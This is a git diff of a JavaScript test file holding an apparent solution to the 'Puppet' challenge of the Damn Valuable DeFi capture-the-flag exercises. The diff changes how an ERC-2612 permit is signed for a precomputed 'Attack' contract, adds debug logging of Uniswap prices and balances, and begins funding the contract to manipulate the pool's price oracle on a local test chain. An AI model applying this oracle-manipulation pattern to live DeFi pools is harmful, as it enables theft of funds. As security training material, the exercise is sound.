@@ -109,6 +109,7 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
         const { signERC2612Permit } = require('eth-permit')
 
         const attackContractAddress = ethers.utils.getContractAddress({
@@ -116,7 +117,7 @@ describe('[Challenge] Puppet', function () {
             nonce: await ethers.provider.getTransactionCount(deployer.address)
         })
 
-        const signa = await signERC2612Permit(
+        const { v, r, s } = await signERC2612Permit(
             player,
             token.address,
             player.address,
@@ -125,33 +126,32 @@ describe('[Challenge] Puppet', function () {
             ethers.constants.MaxUint256,
             0
         )
-        console.log(signa)
-        const domain = {
-            name: 'DamnValuableToken',
-            version: '1',
-            chainId: 31337,
-            verifyingContract: token.address
-        }
+        // const domain = {
+        //     name: 'DamnValuableToken',
+        //     version: '1',
+        //     chainId: 31337,
+        //     verifyingContract: token.address
+        // }
 
-        const types = {
-            Permit: [
-                { name: 'owner', type: 'address' },
-                { name: 'spender', type: 'address' },
-                { name: 'value', type: 'uint256' },
-                { name: 'nonce', type: 'uint256' },
-                { name: 'deadline', type: 'uint256' }
-            ]
-        }
-        const message = {
-            owner: player.address,
-            spender: attackContractAddress,
-            value: PLAYER_INITIAL_TOKEN_BALANCE,
-            nonce: 0,
-            deadline: ethers.constants.MaxUint256
-        }
+        // const types = {
+        //     Permit: [
+        //         { name: 'owner', type: 'address' },
+        //         { name: 'spender', type: 'address' },
+        //         { name: 'value', type: 'uint256' },
+        //         { name: 'nonce', type: 'uint256' },
+        //         { name: 'deadline', type: 'uint256' }
+        //     ]
+        // }
+        // const message = {
+        //     owner: player.address,
+        //     spender: attackContractAddress,
+        //     value: PLAYER_INITIAL_TOKEN_BALANCE,
+        //     nonce: 0,
+        //     deadline: ethers.constants.MaxUint256
+        // }
 
-        const sig = await player._signTypedData(domain, types, message)
-        console.log(sig)
+        // const sig = await player._signTypedData(domain, types, message)
+        // console.log(sig)
 
         const attackContractFactory = await ethers.getContractFactory(
             'Attack',
@@ -165,6 +165,15 @@ describe('[Challenge] Puppet', function () {
             r,
             s
         )
+        console.log(
+            calculateTokenToEthInputPrice(
+                POOL_INITIAL_TOKEN_BALANCE,
+                UNISWAP_INITIAL_TOKEN_RESERVE,
+                UNISWAP_INITIAL_ETH_RESERVE
+            )
+        )
+        console.log(PLAYER_INITIAL_TOKEN_BALANCE)
+        console.log(PLAYER_INITIAL_ETH_BALANCE)
 
         await player.sendTransaction({
             to: attackContract.address,
